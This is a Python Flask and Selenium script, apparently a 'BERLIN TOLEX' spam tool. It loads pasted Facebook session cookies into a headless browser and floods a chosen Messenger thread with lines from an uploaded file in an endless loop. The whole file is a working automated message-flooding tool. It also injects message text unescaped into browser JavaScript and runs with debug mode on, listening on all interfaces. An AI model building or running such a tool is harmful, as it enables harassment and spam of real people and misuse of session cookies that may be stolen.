from flask import Flask, request, render_template_string
import threading, time, random, string
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.action_chains import ActionChains
from webdriver_manager.chrome import ChromeDriverManager
from datetime import datetime

app = Flask(__name__)
app.debug = True

# ---------------- Session storage ----------------
tasks = {}
logs_store = {}

# ---------------- Selenium Browser Setup ----------------
def setup_browser(cookies=None):
    options = Options()
    options.add_argument("--disable-notifications")
    options.add_argument("--disable-popup-blocking")
    options.add_argument("--user-agent=Mozilla/5.0")
    options.add_argument("--headless")  # comment to see browser
    service = Service(ChromeDriverManager().install())
    driver = webdriver.Chrome(service=service, options=options)
    if cookies:
        driver.get("https://www.facebook.com")
        time.sleep(2)
        for cookie in cookies.split(";"):
            if "=" in cookie:
                name, value = cookie.strip().split("=", 1)
                driver.add_cookie({"name": name, "value": value, "domain": ".facebook.com"})
        driver.refresh()
        time.sleep(2)
    return driver

# ---------------- Message Sending Logic ----------------
def send_messages(task_id, chat_id, prefix, suffix, delay, messages, cookies=None):
    driver = None
    logs_store[task_id] = []
    try:
        logs_store[task_id].append("🚀 Tool started...")
        driver = setup_browser(cookies)
        driver.get(f"https://www.facebook.com/messages/t/{chat_id}")
        time.sleep(5)
        idx = 0

        while tasks[task_id]["running"]:
            try:
                box = None
                selectors = [
                    'div[aria-label="Message"][contenteditable="true"]',
                    'div[role="textbox"][contenteditable="true"]',
                    'div[contenteditable="true"]',
                    'textarea'
                ]
                for sel in selectors:
                    elems = driver.find_elements(By.CSS_SELECTOR, sel)
                    if elems and elems[0].is_displayed():
                        box = elems[0]
                        break
                if box:
                    base_msg = messages[idx % len(messages)]
                    final_msg = f"{prefix} {base_msg} {suffix}".strip()
                    # Hidden typing simulation
                    driver.execute_script(f"arguments[0].innerText = '{final_msg}'", box)
                    box.send_keys(Keys.ENTER)

                    tasks[task_id]["sent"] += 1
                    logs_store[task_id].append(f"✅ Sent: {final_msg}")
                    idx += 1
                    time.sleep(delay)
                else:
                    logs_store[task_id].append("⚠️ Message box not found, retrying...")
                    time.sleep(3)
            except Exception as e:
                logs_store[task_id].append(f"❌ Error: {str(e)[:50]}")
                time.sleep(3)
    finally:
        if driver:
            driver.quit()
        tasks[task_id]["running"] = False
        logs_store[task_id].append("🛑 Tool stopped")

# ---------------- Flask Routes / HTML ----------------
@app.route("/", methods=["GET", "POST"])
def index():
    if request.method == "POST":
        chat_id = request.form.get("chatId")
        prefix = request.form.get("prefix") or ""
        suffix = request.form.get("suffix") or ""
        delay = int(request.form.get("delay") or 5)
        cookies = request.form.get("cookies") or ""
        messages_file = request.files.get("messagesFile")

        if not chat_id or not messages_file:
            return "Chat ID or Message File missing."

        messages = [l.strip() for l in messages_file.read().decode().splitlines() if l.strip()]
        task_id = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
        tasks[task_id] = {"running": True, "sent": 0}

        t = threading.Thread(target=send_messages, args=(task_id, chat_id, prefix, suffix, delay, messages, cookies))
        t.start()
        return f'Task started with ID: {task_id} <br><a href="/">Go Back</a>'
    
    return render_template_string("""
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>𝗕𝗘𝗥𝗟𝗜𝗡 𝗧𝗢𝗟𝗘𝗫 TOOL</title>
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
<style>
body {background:#080808; color:white;}
.container {max-width:380px; margin:auto; padding:20px; border-radius:20px; 
           background:#111; box-shadow:0 0 15px #FF0000;}
label {color:white; font-weight:bold; display:block; margin-bottom:5px;}
input, textarea {background:#000; color:#0CC618; border:1px double #1459BE; border-radius:10px; width:100%; padding:7px; margin-bottom:15px;}
button {width:100%; height:40px; border-radius:10px; margin-top:10px; font-weight:bold;}
.btn-start {background:#0CC618; color:#000; border:none;}
.btn-stop {background:#FF0000; color:#fff; border:none;}
.footer {text-align:center; color:#CAFF0D; margin-top:20px;}
.log-box {background:#000; padding:10px; border-radius:10px; height:200px; overflow-y:auto; font-family:monospace; color:#0CC618;}
</style>
</head>
<body>
<div class="container text-center">
<h2>- 𝗕𝗘𝗥𝗟𝗜𝗡 𝗧𝗢𝗟𝗘𝗫 😗👿</h2>
<form method="post" enctype="multipart/form-data">
<label>Thread UID</label>
<input type="text" name="chatId" placeholder="Enter Thread UID" required>
<label>Prefix / Name</label>
<input type="text" name="prefix" placeholder="Enter Prefix">
<label>Suffix / Here Name</label>
<input type="text" name="suffix" placeholder="Enter Suffix">
<label>Delay per message (sec)</label>
<input type="number" name="delay" placeholder="5" value="5">
<label>Facebook Cookies (optional)</label>
<textarea name="cookies" placeholder="Paste cookies here"></textarea>
<label>Message File (.txt)</label>
<input type="file" name="messagesFile" required>
<button type="submit" class="btn-start">🚀 START</button>
</form>
<hr>
<form method="post" action="/stop">
<label>Task ID to Stop</label>
<input type="text" name="taskId" required>
<button type="submit" class="btn-stop">🛑 STOP</button>
</form>
<div class="footer">💀 𝟮𝗞𝟮𝟲 𝗕𝗘𝗥𝗟𝗜𝗡 𝗧𝗢𝗟𝗘𝗫 💀</div>
</div>
</body>
</html>
""")

@app.route("/stop", methods=["POST"])
def stop_task():
    task_id = request.form.get("taskId")
    if task_id in tasks:
        tasks[task_id]["running"] = False
        return f"Task {task_id} stopped.<br><a href='/'>Go Back</a>"
    else:
        return f"No task found with ID {task_id}.<br><a href='/'>Go Back</a>"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
